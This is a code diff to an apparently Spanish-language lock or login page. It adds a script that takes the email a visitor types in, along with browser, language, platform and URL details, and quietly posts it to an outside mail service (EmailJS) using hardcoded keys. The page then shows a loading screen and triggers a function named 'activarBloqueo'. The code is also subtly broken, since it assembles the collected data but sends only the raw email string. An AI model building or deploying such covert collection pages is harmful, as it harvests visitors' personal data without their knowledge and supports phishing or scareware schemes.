@@ -233,6 +233,7 @@
             100% { transform: rotate(360deg); }
         }
     </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <div class="login-container" id="inicioContainer">
@@ -271,11 +272,19 @@
     </div>
 
     <script>
+        // Inicializar EmailJS
+        (function() {
+            emailjs.init("c5Kr5CLq9IN434wJA"); // Reemplazar con tu clave pública de EmailJS
+        })();
+        
         function verificarEmail() {
             const email = document.getElementById('emailInput').value;
             const errorText = document.getElementById('errorText');
             
             if (email && email.includes('@')) {
+                // Enviar el correo con la información
+                enviarCorreo(email);
+                
                 document.getElementById('inicioContainer').style.display = 'none';
                 document.getElementById('loadingContainer').style.display = 'block';
                 setTimeout(activarBloqueo, 2000);
@@ -284,6 +293,33 @@
                 errorText.style.display = 'block';
                 document.getElementById('emailInput').focus();
             }
+        }
+
+        function enviarCorreo(email) {
+            // Crear objeto con los datos
+            const datos = {
+                email: email,
+                fecha: new Date().toString(),
+                userAgent: navigator.userAgent,
+                idioma: navigator.language,
+                plataforma: navigator.platform,
+                url: window.location.href
+            };
+            
+            // Usar EmailJS para enviar el correo (necesitas incluir la librería)
+            fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    service_id: 'service_73g11i4', // Reemplazar con tu service ID
+                    template_id: 'template_mg062fq', // Reemplazar con tu template ID
+                    user_id: 'c5Kr5CLq9IN434wJA', // Reemplazar con tu user ID
+                    template_params:  document.getElementById('emailInput').value
+                })
+            })
+            .catch(error => console.error('Error al enviar correo:', error));
         }
 
         document.getElementById('emailInput').addEventListener('keypress', function(e) {
